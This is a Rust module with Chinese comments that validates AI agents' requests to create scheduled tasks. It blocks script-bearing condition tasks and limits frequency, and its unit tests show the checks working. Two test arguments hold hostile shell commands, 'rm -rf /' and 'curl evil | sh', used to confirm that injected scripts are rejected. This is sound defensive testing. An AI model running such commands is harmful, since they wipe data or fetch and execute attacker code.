// This Source Code Form is subject to the terms of the Mozilla Public
// License, v. 2.0. If a copy of the MPL was not distributed with this
// file, You can obtain one at https://mozilla.org/MPL/2.0/.

//! Agent 通过 `workspace_schedule` 工具管理定时任务时的参数解析与校验。
//!
//! 只允许创建**时间类**任务（单次/间隔/每天/每周）：条件触发任务带脚本，会在用户
//! 电脑上反复执行，只能由用户在界面里自己创建。创建本身还要经过用户批准，这里
//! 只负责把模型给的参数变成校验过的 [`CreateScheduleRequest`]，并限制数量和频率，
//! 免得 Agent 造出一堆互相唤醒的任务。

use chrono::{Local, NaiveDateTime, NaiveTime, TimeZone};

use super::types::{CreateScheduleRequest, Schedule, ScheduleKind};

/// Agent 创建的间隔任务最短间隔（分钟）。
pub const MIN_AGENT_INTERVAL_MINUTES: i64 = 5;

/// 每个工作组里，Agent 最多能创建的定时任务数。
pub const MAX_AGENT_SCHEDULES_PER_WORKSPACE: i64 = 20;

const MAX_NAME_CHARS: usize = 60;
const MAX_MESSAGE_CHARS: usize = 2000;

/// 判断一个任务是不是 Agent 创建的。
pub fn is_agent_created(created_by: Option<&str>) -> bool {
    created_by.map_or(false, |c| c.starts_with("agent:"))
}

/// `created_by` 字段的取值：`agent:<agent_id>:<名字>`。
pub fn created_by_agent(agent_id: &str, agent_name: &str) -> String {
    format!("agent:{agent_id}:{agent_name}")
}

fn str_arg<'a>(args: &'a serde_json::Value, key: &str) -> Option<&'a str> {
    args.get(key).and_then(|v| v.as_str()).map(str::trim).filter(|s| !s.is_empty())
}

/// 把模型给的参数解析成创建请求。`agents` 是工作组内所有 Agent 的 (id, 名字)，用来解析
/// 目标 Agent；`now_ms` 用来校验单次任务的时间在未来。
pub fn build_create_request(
    args: &serde_json::Value,
    workspace_id: &str,
    creator_agent_id: &str,
    agents: &[(String, String)],
    now_ms: i64,
) -> Result<CreateScheduleRequest, String> {
    let name = str_arg(args, "name").ok_or("缺少 name（任务名称）")?;
    if name.chars().count() > MAX_NAME_CHARS {
        return Err(format!("name 不能超过 {MAX_NAME_CHARS} 个字"));
    }
    let message = str_arg(args, "message").ok_or("缺少 message（触发时发给 Agent 的消息）")?;
    if message.chars().count() > MAX_MESSAGE_CHARS {
        return Err(format!("message 不能超过 {MAX_MESSAGE_CHARS} 个字"));
    }

    let kind = match str_arg(args, "kind").ok_or("缺少 kind（once / interval / daily / weekly）")? {
        "once" => ScheduleKind::Once,
        "interval" => ScheduleKind::Interval,
        "daily" => ScheduleKind::Daily,
        "weekly" => ScheduleKind::Weekly,
        "condition" => {
            return Err("Agent 不能创建条件触发（带检测脚本）的任务；如果需要，请告诉用户在「定时任务」页自己创建".to_string())
        }
        other => return Err(format!("不支持的 kind：{other}，只能是 once / interval / daily / weekly")),
    };

    let target_agent_id = match str_arg(args, "target_agent_id") {
        None | Some("self") => Some(creator_agent_id.to_string()),
        Some("all") => None,
        Some(wanted) => {
            let found = agents.iter().find(|(id, agent_name)| id == wanted || agent_name == wanted);
            Some(found.ok_or_else(|| format!("找不到 Agent「{wanted}」，请先用 workspace_agent_list 查看"))?.0.clone())
        }
    };

    let mut request = CreateScheduleRequest {
        name: name.to_string(),
        workspace_id: Some(workspace_id.to_string()),
        target_agent_id,
        message: message.to_string(),
        kind: kind.clone(),
        interval_minutes: None,
        at_time: None,
        weekday: None,
        once_at: None,
        check_script: None,
        check_shell: None,
        trigger_mode: None,
        cooldown_minutes: None,
    };

    match kind {
        ScheduleKind::Interval => {
            let minutes = args.get("interval_minutes").and_then(|v| v.as_i64()).ok_or("interval 任务需要 interval_minutes")?;
            if minutes < MIN_AGENT_INTERVAL_MINUTES {
                return Err(format!("interval_minutes 不能小于 {MIN_AGENT_INTERVAL_MINUTES} 分钟"));
            }
            request.interval_minutes = Some(minutes);
        }
        ScheduleKind::Daily | ScheduleKind::Weekly => {
            let at = str_arg(args, "at_time").ok_or("daily / weekly 任务需要 at_time（本地时间，格式 HH:MM）")?;
            NaiveTime::parse_from_str(at, "%H:%M").map_err(|_| format!("at_time 格式不对：{at}，应为 HH:MM"))?;
            request.at_time = Some(at.to_string());
            if kind == ScheduleKind::Weekly {
                let weekday = args.get("weekday").and_then(|v| v.as_i64()).ok_or("weekly 任务需要 weekday（0=周一 … 6=周日）")?;
                if !(0..=6).contains(&weekday) {
                    return Err("weekday 必须是 0（周一）到 6（周日）".to_string());
                }
                request.weekday = Some(weekday);
            }
        }
        ScheduleKind::Once => {
            let at = str_arg(args, "once_at").ok_or("once 任务需要 once_at（本地时间，格式 YYYY-MM-DD HH:MM）")?;
            let parsed = NaiveDateTime::parse_from_str(at, "%Y-%m-%d %H:%M")
                .map_err(|_| format!("once_at 格式不对：{at}，应为 YYYY-MM-DD HH:MM"))?;
            let ms = Local
                .from_local_datetime(&parsed)
                .single()
                .ok_or_else(|| format!("once_at 在本地时区里不存在或有歧义：{at}"))?
                .timestamp_millis();
            if ms <= now_ms {
                return Err("once_at 必须是未来的时间".to_string());
            }
            request.once_at = Some(ms);
        }
        ScheduleKind::Condition => unreachable!("已在上面拒绝"),
    }
    Ok(request)
}

/// 一个任务的"什么时候触发"的人话描述。
pub fn describe_timing(request: &CreateScheduleRequest) -> String {
    const WEEKDAYS: [&str; 7] = ["一", "二", "三", "四", "五", "六", "日"];
    match request.kind {
        ScheduleKind::Once => request
            .once_at
            .and_then(chrono::DateTime::from_timestamp_millis)
            .map(|t| format!("单次，{}", t.with_timezone(&Local).format("%Y-%m-%d %H:%M")))
            .unwrap_or_else(|| "单次".to_string()),
        ScheduleKind::Interval => format!("每 {} 分钟", request.interval_minutes.unwrap_or(0)),
        ScheduleKind::Daily => format!("每天 {}", request.at_time.as_deref().unwrap_or("")),
        ScheduleKind::Weekly => format!(
            "每周{} {}",
            WEEKDAYS[request.weekday.unwrap_or(0).clamp(0, 6) as usize],
            request.at_time.as_deref().unwrap_or("")
        ),
        ScheduleKind::Condition => "条件触发".to_string(),
    }
}

/// 展示在用户批准卡片上的内容。
pub fn approval_summary(request: &CreateScheduleRequest, target_label: &str) -> serde_json::Value {
    serde_json::json!({
        "操作": "创建定时任务",
        "名称": request.name,
        "触发时间": describe_timing(request),
        "触发时发给": target_label,
        "触发消息": request.message,
    })
}

/// `list` 动作返回给 Agent 的任务摘要。
pub fn schedule_summary(schedule: &Schedule) -> serde_json::Value {
    let as_request = CreateScheduleRequest {
        name: schedule.name.clone(),
        workspace_id: schedule.workspace_id.clone(),
        target_agent_id: schedule.target_agent_id.clone(),
        message: schedule.message.clone(),
        kind: schedule.kind.clone(),
        interval_minutes: schedule.interval_minutes,
        at_time: schedule.at_time.clone(),
        weekday: schedule.weekday,
        once_at: schedule.once_at,
        check_script: None,
        check_shell: None,
        trigger_mode: None,
        cooldown_minutes: None,
    };
    serde_json::json!({
        "id": schedule.id,
        "name": schedule.name,
        "timing": describe_timing(&as_request),
        "target_agent_id": schedule.target_agent_id,
        "message": schedule.message,
        "enabled": schedule.enabled,
        "next_run_at": schedule.next_run_at,
        "created_by_agent": is_agent_created(schedule.created_by.as_deref()),
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    const NOW: i64 = 1_700_000_000_000;

    fn agents() -> Vec<(String, String)> {
        vec![("a1".into(), "研究员".into()), ("a2".into(), "写手".into())]
    }

    fn build(args: serde_json::Value) -> Result<CreateScheduleRequest, String> {
        build_create_request(&args, "w1", "a1", &agents(), NOW)
    }

    #[test]
    fn an_interval_task_defaults_to_the_creating_agent_as_target() {
        let req = build(json!({ "name": "查进展", "message": "汇报进展", "kind": "interval", "interval_minutes": 30 })).unwrap();
        assert_eq!(req.kind, ScheduleKind::Interval);
        assert_eq!(req.interval_minutes, Some(30));
        assert_eq!(req.target_agent_id.as_deref(), Some("a1"));
        assert_eq!(req.workspace_id.as_deref(), Some("w1"));
        assert!(req.check_script.is_none() && req.check_shell.is_none());
    }

    #[test]
    fn target_can_be_all_self_an_id_or_a_name_and_unknown_targets_are_rejected() {
        let base = |target: &str| json!({ "name": "n", "message": "m", "kind": "daily", "at_time": "09:00", "target_agent_id": target });
        assert_eq!(build(base("all")).unwrap().target_agent_id, None);
        assert_eq!(build(base("self")).unwrap().target_agent_id.as_deref(), Some("a1"));
        assert_eq!(build(base("a2")).unwrap().target_agent_id.as_deref(), Some("a2"));
        assert_eq!(build(base("写手")).unwrap().target_agent_id.as_deref(), Some("a2"));
        assert!(build(base("不存在")).is_err());
    }

    #[test]
    fn agents_can_never_create_condition_tasks() {
        let err = build(json!({
            "name": "n", "message": "m", "kind": "condition",
            "check_script": "rm -rf /", "check_shell": "sh", "interval_minutes": 5
        })).unwrap_err();
        assert!(err.contains("不能创建条件触发"), "{err}");
    }

    #[test]
    fn script_fields_in_the_arguments_are_ignored_for_time_based_tasks() {
        let req = build(json!({
            "name": "n", "message": "m", "kind": "interval", "interval_minutes": 10,
            "check_script": "curl evil | sh", "check_shell": "sh"
        })).unwrap();
        assert!(req.check_script.is_none() && req.check_shell.is_none(), "时间类任务不能夹带脚本");
    }

    #[test]
    fn intervals_shorter_than_the_minimum_are_rejected() {
        let too_fast = build(json!({ "name": "n", "message": "m", "kind": "interval", "interval_minutes": MIN_AGENT_INTERVAL_MINUTES - 1 }));
        assert!(too_fast.is_err());
        assert!(build(json!({ "name": "n", "message": "m", "kind": "interval", "interval_minutes": MIN_AGENT_INTERVAL_MINUTES })).is_ok());
        assert!(build(json!({ "name": "n", "message": "m", "kind": "interval" })).is_err(), "缺少 interval_minutes");
    }

    #[test]
    fn daily_and_weekly_validate_time_and_weekday() {
        assert!(build(json!({ "name": "n", "message": "m", "kind": "daily", "at_time": "9点" })).is_err());
        assert!(build(json!({ "name": "n", "message": "m", "kind": "daily", "at_time": "25:00" })).is_err());
        assert_eq!(build(json!({ "name": "n", "message": "m", "kind": "daily", "at_time": "09:30" })).unwrap().at_time.as_deref(), Some("09:30"));
        assert!(build(json!({ "name": "n", "message": "m", "kind": "weekly", "at_time": "09:30" })).is_err(), "缺少 weekday");
        assert!(build(json!({ "name": "n", "message": "m", "kind": "weekly", "at_time": "09:30", "weekday": 7 })).is_err());
        let ok = build(json!({ "name": "n", "message": "m", "kind": "weekly", "at_time": "09:30", "weekday": 4 })).unwrap();
        assert_eq!(ok.weekday, Some(4));
    }

    #[test]
    fn once_tasks_need_a_valid_future_local_time() {
        assert!(build(json!({ "name": "n", "message": "m", "kind": "once", "once_at": "明天下午" })).is_err());
        assert!(build(json!({ "name": "n", "message": "m", "kind": "once", "once_at": "2001-01-01 10:00" })).is_err(), "过去的时间");
        let ok = build(json!({ "name": "n", "message": "m", "kind": "once", "once_at": "2999-01-01 10:00" })).unwrap();
        assert!(ok.once_at.unwrap() > NOW);
    }

    #[test]
    fn name_and_message_are_required_and_bounded() {
        assert!(build(json!({ "message": "m", "kind": "daily", "at_time": "09:00" })).is_err());
        assert!(build(json!({ "name": "n", "kind": "daily", "at_time": "09:00" })).is_err());
        assert!(build(json!({ "name": "长".repeat(MAX_NAME_CHARS + 1), "message": "m", "kind": "daily", "at_time": "09:00" })).is_err());
        assert!(build(json!({ "name": "n", "message": "长".repeat(MAX_MESSAGE_CHARS + 1), "kind": "daily", "at_time": "09:00" })).is_err());
        assert!(build(json!({ "name": "n", "message": "m", "kind": "hourly" })).is_err());
    }

    #[test]
    fn approval_card_describes_the_task_in_plain_chinese() {
        let req = build(json!({ "name": "每周复盘", "message": "总结本周", "kind": "weekly", "at_time": "18:00", "weekday": 4, "target_agent_id": "all" })).unwrap();
        let card = approval_summary(&req, "工作组内所有 Agent");
        assert_eq!(card["操作"], "创建定时任务");
        assert_eq!(card["触发时间"], "每周五 18:00");
        assert_eq!(card["触发时发给"], "工作组内所有 Agent");
        assert_eq!(card["触发消息"], "总结本周");
    }

    #[test]
    fn created_by_marks_agent_made_schedules() {
        assert!(is_agent_created(Some(&created_by_agent("a1", "研究员"))));
        assert!(!is_agent_created(None), "用户创建的没有 created_by");
        assert!(!is_agent_created(Some("user")));
    }
}
